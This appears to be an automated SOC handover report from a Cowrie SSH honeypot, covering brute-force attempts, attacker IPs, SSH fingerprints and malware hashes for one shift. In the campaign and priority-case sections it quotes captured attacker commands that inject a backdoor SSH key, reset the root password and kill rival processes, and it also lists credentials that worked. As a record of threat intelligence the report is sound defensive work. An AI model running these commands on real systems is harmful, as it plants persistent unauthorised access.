# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-11 |
| **Generated At** | 2026-05-11T17:58:45Z |
| **Shift Time** | 17:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **200** |
| Confirmed Threats | **116** |
| False Positives Filtered | **84** (42.0%) |
| Unique Attacker IPs | **44** |
| Countries of Origin | **22** |
| High Severity Cases | **5** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **195** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **43** |
| Unique Credential Pairs | **39** |
| Unique Usernames | **23** |
| Unique Passwords | **38** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 7 |
| `root` | 5 |
| `admin` | 4 |
| `test` | 4 |
| `345gs5662d34` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 2 |
| `test123` | 2 |
| `ubuntu` | 2 |
| `toor` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 2 |
| `test` | `ubuntu` | 2 |
| `admin` | `toor` | 1 |
| `admin` | `1qaz#EDC` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `users` | `213.230.127.104` | 2026-05-11T15:46:06 |
| `root` | `3245gs5662d34` | `213.230.127.104` | 2026-05-11T15:46:10 |
| `root` | `admin@123!@` | `213.230.127.104` | 2026-05-11T15:52:38 |
| `root` | `admin198988!@_@!` | `163.53.168.23` | 2026-05-11T17:02:09 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **200** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 97 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 60 | 5 |
| `af8223ac9914...` | libssh-based | 33 | 1 |
| `97281db8c1a6...` | Modern SSH client | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 60 | 5 | Modern SSH client |
| `af8223ac9914...` | libssh | 33 | 1 | libssh-based |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `97281db8c1a6...` | libssh | 1 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:wjSo6VDR7hle"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `163.53.168.23`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `213.230.127.104`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **44** |
| Unique ASNs | **38** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS55836` | Reliance Jio Infocomm Limited | 3 | LOW |
| `AS151732` | ONREMOTE TELECOM PRIVATE LIMITED | 2 | LOW |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS151066` | Imperial network inc | 1 | LOW |
| `AS1267` | WIND TRE S.P.A. | 1 | HIGH |
| `AS36924` | GVA Cote d'Ivoire SAS | 1 | LOW |
| `AS8346` | SONATEL-AS Autonomous System | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (5)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-10bea3efcf9f

| Field | Detail |
|---|---|
| **Source IP** | `213.230.127[.]104` |
| **First Seen** | 2026-05-11 15:46 |
| **Last Seen** | 2026-05-11 15:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 15:46:05` | `cowrie.session.connect` |
| `2026-05-11 15:46:05` | `cowrie.client.version` |
| `2026-05-11 15:46:06` | `cowrie.client.kex` |
| `2026-05-11 15:46:06` | `cowrie.login.success` |
| `2026-05-11 15:46:07` | `cowrie.session.params` |
| `2026-05-11 15:46:07` | `cowrie.command.input` |
| `2026-05-11 15:46:07` | `cowrie.command.failed` |
| `2026-05-11 15:46:07` | `cowrie.log.closed` |
| `2026-05-11 15:46:07` | `cowrie.session.params` |
| `2026-05-11 15:46:07` | `cowrie.command.input` |
| `2026-05-11 15:46:07` | `cowrie.session.file_download` |
| `2026-05-11 15:46:07` | `cowrie.log.closed` |
| `2026-05-11 15:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.127[.]104` to AbuseIPDB if not already reported
- [ ] Block `213.230.127[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1a615d79224

| Field | Detail |
|---|---|
| **Source IP** | `213.230.127[.]104` |
| **First Seen** | 2026-05-11 15:46 |
| **Last Seen** | 2026-05-11 15:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 15:46:09` | `cowrie.session.connect` |
| `2026-05-11 15:46:09` | `cowrie.client.version` |
| `2026-05-11 15:46:09` | `cowrie.client.kex` |
| `2026-05-11 15:46:10` | `cowrie.login.success` |
| `2026-05-11 15:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.127[.]104` to AbuseIPDB if not already reported
- [ ] Block `213.230.127[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6962df2ade5

| Field | Detail |
|---|---|
| **Source IP** | `213.230.127[.]104` |
| **First Seen** | 2026-05-11 15:52 |
| **Last Seen** | 2026-05-11 15:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 15:52:38` | `cowrie.session.connect` |
| `2026-05-11 15:52:38` | `cowrie.client.version` |
| `2026-05-11 15:52:38` | `cowrie.client.kex` |
| `2026-05-11 15:52:38` | `cowrie.login.success` |
| `2026-05-11 15:52:39` | `cowrie.session.params` |
| `2026-05-11 15:52:39` | `cowrie.command.input` |
| `2026-05-11 15:52:39` | `cowrie.command.failed` |
| `2026-05-11 15:52:39` | `cowrie.log.closed` |
| `2026-05-11 15:52:39` | `cowrie.session.params` |
| `2026-05-11 15:52:39` | `cowrie.command.input` |
| `2026-05-11 15:52:39` | `cowrie.session.file_download` |
| `2026-05-11 15:52:39` | `cowrie.log.closed` |
| `2026-05-11 15:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.127[.]104` to AbuseIPDB if not already reported
- [ ] Block `213.230.127[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9939695310a1

| Field | Detail |
|---|---|
| **Source IP** | `213.230.127[.]104` |
| **First Seen** | 2026-05-11 15:52 |
| **Last Seen** | 2026-05-11 15:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 15:52:41` | `cowrie.session.connect` |
| `2026-05-11 15:52:41` | `cowrie.client.version` |
| `2026-05-11 15:52:41` | `cowrie.client.kex` |
| `2026-05-11 15:52:42` | `cowrie.login.success` |
| `2026-05-11 15:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.127[.]104` to AbuseIPDB if not already reported
- [ ] Block `213.230.127[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e208f1459971

| Field | Detail |
|---|---|
| **Source IP** | `163.53.168[.]23` |
| **First Seen** | 2026-05-11 17:02 |
| **Last Seen** | 2026-05-11 17:02 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:wjSo6VDR7hle"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 17:02:09` | `cowrie.session.connect` |
| `2026-05-11 17:02:09` | `cowrie.client.version` |
| `2026-05-11 17:02:09` | `cowrie.client.kex` |
| `2026-05-11 17:02:09` | `cowrie.login.success` |
| `2026-05-11 17:02:10` | `cowrie.session.params` |
| `2026-05-11 17:02:10` | `cowrie.command.input` |
| `2026-05-11 17:02:10` | `cowrie.command.failed` |
| `2026-05-11 17:02:10` | `cowrie.log.closed` |
| `2026-05-11 17:02:10` | `cowrie.session.params` |
| `2026-05-11 17:02:10` | `cowrie.command.input` |
| `2026-05-11 17:02:10` | `cowrie.session.file_download` |
| `2026-05-11 17:02:10` | `cowrie.log.closed` |
| `2026-05-11 17:02:18` | `cowrie.session.params` |
| `2026-05-11 17:02:18` | `cowrie.command.input` |
| `2026-05-11 17:02:19` | `cowrie.log.closed` |
| `2026-05-11 17:02:19` | `cowrie.session.params` |
| `2026-05-11 17:02:19` | `cowrie.command.input` |
| `2026-05-11 17:02:19` | `cowrie.log.closed` |
| `2026-05-11 17:02:19` | `cowrie.session.params` |
| `2026-05-11 17:02:19` | `cowrie.command.input` |
| `2026-05-11 17:02:20` | `cowrie.session.file_download` |
| `2026-05-11 17:02:20` | `cowrie.log.closed` |
| `2026-05-11 17:02:20` | `cowrie.session.params` |
| `2026-05-11 17:02:20` | `cowrie.command.input` |
| `2026-05-11 17:02:20` | `cowrie.log.closed` |
| `2026-05-11 17:02:20` | `cowrie.session.params` |
| `2026-05-11 17:02:20` | `cowrie.command.input` |
| `2026-05-11 17:02:21` | `cowrie.log.closed` |
| `2026-05-11 17:02:21` | `cowrie.session.params` |
| `2026-05-11 17:02:21` | `cowrie.command.input` |
| `2026-05-11 17:02:21` | `cowrie.command.input` |
| `2026-05-11 17:02:21` | `cowrie.log.closed` |
| `2026-05-11 17:02:21` | `cowrie.session.params` |
| `2026-05-11 17:02:21` | `cowrie.command.input` |
| `2026-05-11 17:02:21` | `cowrie.log.closed` |
| `2026-05-11 17:02:22` | `cowrie.session.params` |
| `2026-05-11 17:02:22` | `cowrie.command.input` |
| `2026-05-11 17:02:22` | `cowrie.log.closed` |
| `2026-05-11 17:02:22` | `cowrie.session.params` |
| `2026-05-11 17:02:22` | `cowrie.command.input` |
| `2026-05-11 17:02:22` | `cowrie.log.closed` |
| `2026-05-11 17:02:23` | `cowrie.session.params` |
| `2026-05-11 17:02:23` | `cowrie.command.input` |
| `2026-05-11 17:02:23` | `cowrie.log.closed` |
| `2026-05-11 17:02:23` | `cowrie.session.params` |
| `2026-05-11 17:02:23` | `cowrie.command.input` |
| `2026-05-11 17:02:23` | `cowrie.log.closed` |
| `2026-05-11 17:02:24` | `cowrie.session.params` |
| `2026-05-11 17:02:24` | `cowrie.command.input` |
| `2026-05-11 17:02:24` | `cowrie.log.closed` |
| `2026-05-11 17:02:24` | `cowrie.session.params` |
| `2026-05-11 17:02:24` | `cowrie.command.input` |
| `2026-05-11 17:02:24` | `cowrie.log.closed` |
| `2026-05-11 17:02:25` | `cowrie.session.params` |
| `2026-05-11 17:02:25` | `cowrie.command.input` |
| `2026-05-11 17:02:25` | `cowrie.log.closed` |
| `2026-05-11 17:02:25` | `cowrie.session.params` |
| `2026-05-11 17:02:25` | `cowrie.command.input` |
| `2026-05-11 17:02:25` | `cowrie.log.closed` |
| `2026-05-11 17:02:26` | `cowrie.session.params` |
| `2026-05-11 17:02:26` | `cowrie.command.input` |
| `2026-05-11 17:02:26` | `cowrie.log.closed` |
| `2026-05-11 17:02:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.53.168[.]23` to AbuseIPDB if not already reported
- [ ] Block `163.53.168[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `163.53.168[.]23` | **31** | 2026-05-11 16:45 | 2026-05-11 17:05 | 48m | 6 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `213.230.127[.]104` | **29** | 2026-05-11 15:31 | 2026-05-11 15:57 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.118[.]226` | **28** | 2026-05-11 16:46 | 2026-05-11 17:16 | 47m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.106.29[.]190` | **4** | 2026-05-11 15:57 | 2026-05-11 16:06 | 8m | 0 | `T1592` | 🟢 LOW |
| `3.15.169[.]123` | **3** | 2026-05-11 17:11 | 2026-05-11 17:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `128.203.204[.]215` | **2** | 2026-05-11 15:36 | 2026-05-11 15:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `151.93.114[.]62` | **2** | 2026-05-11 15:18 | 2026-05-11 15:19 | 1m | 0 | `T1592` | 🟢 LOW |
| `20.163.14[.]130` | **2** | 2026-05-11 16:47 | 2026-05-11 16:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.191.27[.]59` | 1 | 2026-05-11 17:56 | 2026-05-11 17:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `135.148.14[.]151` | 1 | 2026-05-11 17:40 | 2026-05-11 17:40 | 33s | 0 | `T1592` | 🟢 LOW |
| `14.103.55[.]226` | 1 | 2026-05-11 17:57 | 2026-05-11 17:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.42.93[.]139` | 1 | 2026-05-11 16:53 | 2026-05-11 16:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `213.199.63[.]29` | 1 | 2026-05-11 16:10 | 2026-05-11 16:10 | 30s | 0 | `T1592` | 🟢 LOW |
| `220.154.131[.]136` | 1 | 2026-05-11 15:22 | 2026-05-11 15:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.91.64[.]6` | 1 | 2026-05-11 16:53 | 2026-05-11 16:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.159.194[.]116` | 1 | 2026-05-11 17:51 | 2026-05-11 17:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.240.236[.]116` | 1 | 2026-05-11 17:43 | 2026-05-11 17:43 | 10s | 0 | `T1592` | 🟢 LOW |
| `72.196.240[.]51` | 1 | 2026-05-11 15:49 | 2026-05-11 15:49 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 8/100 | 🟢 LOW | **20/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `151.93.114[.]62` | IT | WIND TRE S.P.A. | **100** ⚠️ | 3 |
| `72.196.240[.]51` | US | Cox Communications | **100** ⚠️ | 5 |
| `213.199.63[.]29` | FR | Contabo GmbH | **100** ⚠️ | 2 |
| `45.91.64[.]6` | RU | F6 | **100** ⚠️ | 50 |
| `220.154.131[.]136` | CN | China Telecom Group Corporation Qingdao Branch | **100** ⚠️ | 5 |
| `51.159.194[.]116` | FR | Scaleway | **100** ⚠️ | 3 |
| `115.191.27[.]59` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 12 |
| `3.15.169[.]123` | US | Amazon Technologies Inc. | **100** ⚠️ | 27 |
| `135.148.14[.]151` | US | Chirag, Patel | **100** ⚠️ | 3 |
| `213.230.127[.]104` | UZ | Uzbektelekom Joint Stock Company | **100** ⚠️ | 32 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 98 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 38 |
